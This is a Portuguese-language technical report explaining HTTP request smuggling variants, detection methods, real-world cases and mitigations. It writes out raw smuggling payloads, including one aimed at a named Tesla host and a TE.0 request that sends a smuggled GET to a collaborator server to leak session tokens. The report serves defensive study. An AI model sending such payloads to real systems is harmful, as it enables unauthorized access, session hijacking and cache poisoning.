# Subvertendo a Confiança: Uma Análise Aprofundada de Dessincronização HTTP, Envenenamento de Cache e Outras Falhas de Lógica de Negócios na Arquitetura Web Moderna

## Introdução

Vulnerabilidades de lógica de negócios exploram falhas nas regras operacionais de uma aplicação, indo além de manipulações óbvias, como preços em carrinhos de compras, para atingir suposições fundamentais da infraestrutura web. O **HTTP Request Smuggling** (Dessincronização HTTP) é uma dessas falhas, explorando discrepâncias na interpretação de limites de requisições HTTP entre servidores front-end e back-end. Essa vulnerabilidade permite contornar controles de segurança, sequestrar sessões, envenenar caches e entregar ataques do lado do cliente, como XSS, sem interação da vítima.

Este relatório desconstrói o HTTP Request Smuggling, detalhando sua base arquitetônica, variantes de ataque, métodos de detecção e estratégias de mitigação, com estudos de caso reais (ex.: Google Cloud, Tesla).

## Seção 1: A Anatomia da Dessincronização: Fundamentos do HTTP Request Smuggling

### A Arquitetura Web Multi-camadas Moderna: Servidores Front-End vs. Back-End

Aplicações web modernas utilizam arquiteturas multi-camadas com:

- **Proxies Reversos**: Intermediam requisições.
- **Balanceadores de Carga**: Distribuem tráfego.
- **CDNs**: Aceleram entrega de conteúdo.
- **WAFs**: Filtram requisições maliciosas.

A otimização via **Connection: keep-alive** no HTTP/1.1 reutiliza conexões TCP/TLS, mas cria uma superfície de ataque. A dessincronização ocorre quando servidores discordam sobre os limites de uma requisição, permitindo que um atacante "envenene" a conexão com dados maliciosos que afetam requisições subsequentes.

### Definindo Limites: Content-Length vs. Transfer-Encoding

O HTTP/1.1 usa dois cabeçalhos para delimitar requisições:

- **Content-Length (CL)**: Especifica o tamanho do corpo em bytes.
- **Transfer-Encoding: chunked (TE)**: Divide o corpo em *chunks*, terminados por `0\r\n\r\n`.

A RFC 7230 prioriza TE sobre CL, mas implementações inconsistentes criam vulnerabilidades.

### A Gênese da Vulnerabilidade

A dessincronização surge quando front-end e back-end interpretam CL e TE de forma diferente. Uma requisição ambígua (contendo ambos os cabeçalhos) pode fazer o front-end encaminhar dados que o back-end interpreta como múltiplas requisições, deixando bytes maliciosos no buffer.

## Seção 2: Uma Taxonomia das Variantes de HTTP Request Smuggling

### Ataques Clássicos: CL.TE e TE.CL

- **CL.TE**: Front-end usa CL, back-end usa TE.

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0
SMUGGLED_REQUEST
```

**Análise**:
- **Front-End (CL)**: Lê 13 bytes (ex.: `0\r\n\r\nSMUGGLED`).
- **Back-End (TE)**: Vê chunk `0` como fim, deixando `SMUGGLED_REQUEST` no buffer.

- **TE.CL**: Front-end usa TE, back-end usa CL.

```http
POST /?cb=906971031432954 HTTP/1.1
Host: apm.ap.tesla.services
Content-Length: 65
Transfer-Encoding: chunked

1
Z
0

GET /metrics HTTP/1.1
Host: apm.ap.tesla.services
```

**Análise**:
- **Front-End (TE)**: Processa chunks, encaminha tudo.
- **Back-End (CL)**: Lê 65 bytes, deixando o restante (ex.: `GET /metrics`) no buffer.

### Ataques Baseados em Ofuscação: TE.TE

Ambos os servidores usam TE, mas um é enganado por ofuscação (ex.: `Transfer-Encoding: xchunked`).

### Vulnerabilidades CL.0 e TE.0

- **CL.0**: Back-end ignora CL, tratando requisições como sem corpo.

```http
POST /vulnerable-endpoint HTTP/1.1
Host: vulnerable-website.com
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: x
```

**Análise**:
- **Front-End (CL)**: Encaminha 34 bytes.
- **Back-End (CL.0)**: Ignora corpo, deixando `GET /hopefully404` no buffer.

- **TE.0**: Explora falhas na interpretação de TE (ex.: Google Cloud).

```http
OPTIONS / HTTP/1.1
Host: {HOST}
Transfer-Encoding: chunked

50
GET http://our-collaborator-server/ HTTP/1.1
x: X

0
```

**Resultado**: Requisição `GET` contrabandeada vaza tokens de sessão.

### Ataques de Downgrade de HTTP/2

- **H2.CL**: Content-Length incorreto em HTTP/2 é passado para HTTP/1.1.
- **H2.TE**: Transfer-Encoding proibido em HTTP/2 passa no downgrade.
- **Injeção de CRLF**: Sequências `\r\n` em cabeçalhos HTTP/2 criam divisões no HTTP/1.1.

**Tabela 1: Variantes de HTTP Request Smuggling**

| Variante | Front-End | Back-End | Cabeçalhos Chave | Método de Exploração |
|----------|-----------|----------|------------------|----------------------|
| CL.TE    | Usa CL    | Usa TE   | CL, TE           | CL menor que corpo com chunk `0` |
| TE.CL    | Usa TE    | Usa CL   | TE, CL           | TE com CL pequeno |
| TE.TE    | Usa TE    | Usa TE   | TE (ofuscado)    | Ofuscação de TE |
| CL.0     | Usa CL    | Ignora CL | CL              | POST com corpo em endpoint sem corpo |
| TE.0     | Usa TE    | Falha TE | TE               | Falha específica em TE |
| H2.CL    | HTTP/2    | Usa CL   | content-length   | CL incorreto no downgrade |
| H2.TE    | HTTP/2    | Usa TE   | transfer-encoding | TE ilegal no downgrade |

## Seção 3: Metodologias para Detecção e Confirmação

### Sondagem de Vulnerabilidades: Técnicas de Temporização

- **CL.TE**:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

**Análise**: Front-end lê 4 bytes, back-end aguarda chunk, causando *timeout*.

- **TE.CL**:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

**Análise**: Front-end processa chunk `0`, back-end aguarda 6 bytes, causando atraso.

Testar CL.TE primeiro para evitar impacto em outros usuários.

### Confirmando a Falha: Resposta Diferencial

1. **Requisição de Ataque (CL.TE)**:

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0
GET /404 HTTP/1.1
Foo: x
```

2. **Requisição Normal**:

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Length: 11

q=smuggling
```

**Resultado**: Resposta 404 confirma vulnerabilidade.

### Ferramentas

- **Burp Suite HTTP Request Smuggler**: Automatiza sondagens e ataques.
- **Burp Suite Repeater**: Permite ajustes manuais para confirmação.

## Seção 4: A Cascata de Impacto: Exploração e Ataques em Cadeia

### Contorno de Controles de Segurança

- **Acesso a Endpoints Restritos**: Ex.: Contrabando de `GET /admin`.
- **Contorno de Autenticação**: Injeção de cabeçalhos (ex.: `X-SSL-CLIENT-CN: administrator`).

### Sequestro de Sessão e Exfiltração de Dados

- Contrabando de POST para formulários armazena cookies de vítimas como comentários, permitindo roubo de sessões.

### Envenenamento da Fila de Respostas

- Contrabando de requisição completa dessincroniza respostas, entregando dados de uma vítima a outra.

### Envenenamento de Cache da Web

- Requisição contrabandeada provoca resposta maliciosa (ex.: XSS), armazenada no cache para todos os usuários.

### Ataques do Lado do Cliente

- **XSS Refletido**: Payload XSS contrabandeado afeta vítimas.
- **Vulnerabilidades DOM**: Injeção em campos refletidos no DOM.

## Seção 5: Estudos de Caso do Mundo Real

- **TE.0 no Google Cloud**: Ataque sem cliques vazou tokens via Google Load Balancer, contornando o Identity-Aware Proxy.
- **Tesla (apm.ap.tesla.services)**: Payload TE.CL acessou endpoint `/metrics`, contornando autenticação.
- **HAProxy (CVE-2019-18277)**: Cabeçalho TE malformado causou dessincronização CL.TE.
- **Apache mod_proxy**:
  - **CVE-2022-26377**: Parsing inconsistente no mod_proxy_ajp.
  - **CVE-2023-25690**: RewriteRule permitiu divisão de requisições.

**Tabela 2: CVEs de HTTP Request Smuggling**

| CVE ID         | Software/Módulo       | Versões Vulneráveis       | Mitigação         |
|----------------|-----------------------|---------------------------|-------------------|
| CVE-2019-18277 | HAProxy               | < 2.0.6 (modo legado)    | HAProxy 2.0.6+    |
| CVE-2022-26377 | Apache mod_proxy_ajp  | 2.4.0 a 2.4.53           | Apache 2.4.54+    |
| CVE-2023-25690 | Apache mod_proxy      | 2.4.0 a 2.4.55           | Apache 2.4.56+    |

## Seção 6: Estratégias Abrangentes de Mitigação e Defesa

### Endurecimento em Nível de Protocolo

- **HTTP/2 e HTTP/3**: Eliminam ambiguidades com *framing* binário.
- **Desativar Downgrade**: Validar cabeçalhos HTTP/2 antes de traduzir para HTTP/1.1.

### Endurecendo HTTP/1.1

- **Normalizar Requisições**: Rejeitar CL e TE simultâneos.
- **Desativar Reuso de Conexão**: Fechar conexões após cada requisição.
- **Homogeneidade**: Usar mesmo software (ex.: Nginx) em front-end e back-end.

### Configurações Específicas

- **Nginx**: Rejeita CL+TE por padrão (v1.26+).
- **HAProxy**: Atualizar para 2.0.6+, evitar `http-reuse always`.
- **AWS ALB**: Usar modo "Strictest" de mitigação de dessincronização.

### Defesa em Profundidade

- **WAFs**: Detectam padrões, mas podem ser contornados.
- **Testes Contínuos**: Usar DAST e pentests para identificar falhas.

## Conclusão

O HTTP Request Smuggling revela falhas sistêmicas na interação entre servidores, explorando a confiança implícita no protocolo HTTP/1.1. Variantes como CL.TE, TE.0 e ataques de downgrade HTTP/2 amplificam o impacto, permitindo desde contorno de segurança até comprometimento em massa. A mitigação exige HTTP/2 ou HTTP/3, normalização de requisições e testes contínuos, garantindo que a lógica de negócios da infraestrutura não seja subvertida.